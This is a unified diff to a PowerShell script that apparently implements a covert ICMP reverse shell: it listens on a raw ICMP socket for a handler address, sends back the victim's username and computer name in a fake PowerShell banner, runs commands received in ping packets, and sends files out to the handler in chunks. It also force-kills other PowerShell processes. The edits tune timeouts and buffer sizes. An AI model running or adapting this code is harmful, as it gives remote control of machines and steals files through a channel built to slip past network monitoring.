@@ -3,7 +3,7 @@ Add-Type -AssemblyName  Microsoft.VisualBasic, PresentationCore, PresentationFra
 $F = [Windows.Native.Kernel32]::GetCurrentConsoleFontEx(); $F.FontIndex = 0; $F.FontWidth = 6; $F.FontHeight = 12; $F.FontFamily = 54; $F.FontWeight = 1000; $F.FaceName = "SimSun-ExtB"; [Windows.Native.Kernel32]::SetCurrentConsoleFontEx($F)
 (Get-Process | Where-Object {$_.ProcessName -eq "powershell" -and $_.Id -ne $PID} | Select-Object -ExpandProperty Id) | % {Stop-Process -Id $_ -Force}
 [char]$EL = 14
-
+#$mtu = [int]((netsh interface ipv4 show subinterfaces | Select-String -Pattern ((Get-NetRoute | Where-Object { $_.DestinationPrefix -eq '0.0.0.0/0' } | Sort-Object -Property Metric | Select-Object -First 1 | Get-NetAdapter).Name) | Select-Object -First 1) -split '\s+')[1] -1
 $BindingIP = ((Get-NetIPAddress | Where-Object { $_.AddressState -eq "Preferred" -and $_.ValidLifetime -lt "24:00:00" }).IPAddress)
 
 $pRs = [System.Net.Sockets.Socket]::new([Net.Sockets.AddressFamily]::InterNetwork, [Net.Sockets.SocketType]::Raw, [Net.Sockets.ProtocolType]::Icmp)
@@ -16,7 +16,7 @@ $PingOptions = [System.Net.NetworkInformation.PingOptions]::new()
 $PingOptions.DontFragment = $true
 
 function ret {
-  $FeedBack = ([System.Text.Encoding]::ASCII.GetString($script:buffer[28..$pRs.ReceiveBufferSize]))
+  $FeedBack = ([System.Text.Encoding]::ASCII.GetString($script:buffer[28..(1472)]))
   $FeedBack = ($FeedBack.Substring(0, ($FeedBack.IndexOf($script:EL)))) 
   return $FeedBack
 }
@@ -45,8 +45,8 @@ while ($true) {
 
   if ((ret) -eq "H_IP") {
     $pRs.Receive($buffer) | out-null; $H_IP = (ret)
-    $sc.Send([ipaddress]$H_IP, 60 * 1000, (([text.encoding]::ASCII).GetBytes("Windows PowerShell running as user " + $env:username + " on " + $env:computername + "`nCopyright (C) 2015 Microsoft Corporation. All rights reserved." + $EL)), $PingOptions)    
-    $sc.Send([ipaddress]$H_IP, 60 * 1000, (([text.encoding]::ASCII).GetBytes("PS " + (Get-Location).Path + "> " + $EL)), $PingOptions)
+    $sc.Send([ipaddress]$H_IP, "20", (([text.encoding]::ASCII).GetBytes("Windows PowerShell running as user " + $env:username + " on " + $env:computername + "`nCopyright (C) 2015 Microsoft Corporation. All rights reserved." + $EL)), $PingOptions)    
+    $sc.Send([ipaddress]$H_IP, "20", (([text.encoding]::ASCII).GetBytes("PS " + (Get-Location).Path + "> " + $EL)), $PingOptions)
   } 
   elseif ((ret) -eq "Transfer") {
     Write-Verbose "Transfer"
@@ -56,7 +56,7 @@ while ($true) {
 
     
       if ($fileSize -gt 60000) {
-        $sc.Send($H_IP , 60 * 1000, (([text.encoding]::ASCII).GetBytes("True" + $EL)), $PingOptions) | out-null
+        $sc.Send($H_IP , "20", (([text.encoding]::ASCII).GetBytes("True" + $EL)), $PingOptions) | out-null
         [int]$bufSize = 1472; $stream = [System.IO.File]::OpenRead($inFile); $chunkNum = 0
         $TotalChunks = [math]::floor($stream.Length / 1472); $barr = New-Object byte[] $bufSize
         while ($stream.Read($barr, 0, $bufsize)) {
@@ -67,24 +67,24 @@ while ($true) {
           [string]$s = $s -replace "inFile", $inFile
           [string]$s = $s -replace "chunkNum", $chunkNum
           [string]$s = $s -replace "TotalChunks", $TotalChunks
-          $sc.Send($H_IP , 60 * 1000, (([text.encoding]::ASCII).GetBytes([string]$s + $EL)), $PingOptions) | out-null
+          $sc.Send($H_IP , "20", (([text.encoding]::ASCII).GetBytes([string]$s + $EL)), $PingOptions) | out-null
     
           $chunkNum += 1
           if ($chunkNum -gt ($TotalChunks)) {
-            $sc.Send($H_IP , 60 * 1000, (([text.encoding]::ASCII).GetBytes("End" + $EL)), $PingOptions) | out-null
+            $sc.Send($H_IP , "20", (([text.encoding]::ASCII).GetBytes("End" + $EL)), $PingOptions) | out-null
             write-host ENDING
             break
           }
           else {
             Write-Output "Done with $chunkNum out of $TotalChunks"
-            $sc.Send($H_IP , 60 * 1000, $barr + (([text.encoding]::ASCII).GetBytes($EL)), $PingOptions) | out-null
+            $sc.Send($H_IP , "20", $barr + (([text.encoding]::ASCII).GetBytes($EL)), $PingOptions) | out-null
             $pRs.Receive($buffer)
           }      
         }
       }
       elseif ($fileSize -lt 60000) {
-        $sc.Send($H_IP , 60 * 1000, (([text.encoding]::ASCII).GetBytes("False" + $EL)), $PingOptions) | out-null
-        $sc.Send($H_IP , 60 * 1000, (([text.encoding]::ASCII).GetBytes([string](gc $Infile) + $EL)), $PingOptions) | out-null
+        $sc.Send($H_IP , "20", (([text.encoding]::ASCII).GetBytes("False" + $EL)), $PingOptions) | out-null
+        $sc.Send($H_IP , "20", (([text.encoding]::ASCII).GetBytes([string](gc $Infile) + $EL)), $PingOptions) | out-null
       }
   }
   elseif (((ret) -ne "H_IP") -and ((ret) -ne "Transfer")) {
@@ -97,7 +97,7 @@ while ($true) {
       $com = ""
     }
   
-    $sc.Send([ipaddress]$H_IP, 60 * 1000, (([text.encoding]::ASCII).GetBytes($com + $EL)), $PingOptions)
-    $sc.Send([ipaddress]$H_IP, 60 * 1000, (([text.encoding]::ASCII).GetBytes("PS " + (Get-Location).Path + "> " + $EL)), $PingOptions)
+    $sc.Send([ipaddress]$H_IP, "20", (([text.encoding]::ASCII).GetBytes($com + $EL)), $PingOptions)
+    $sc.Send([ipaddress]$H_IP, "20", (([text.encoding]::ASCII).GetBytes("PS " + (Get-Location).Path + "> " + $EL)), $PingOptions)
   }
 }
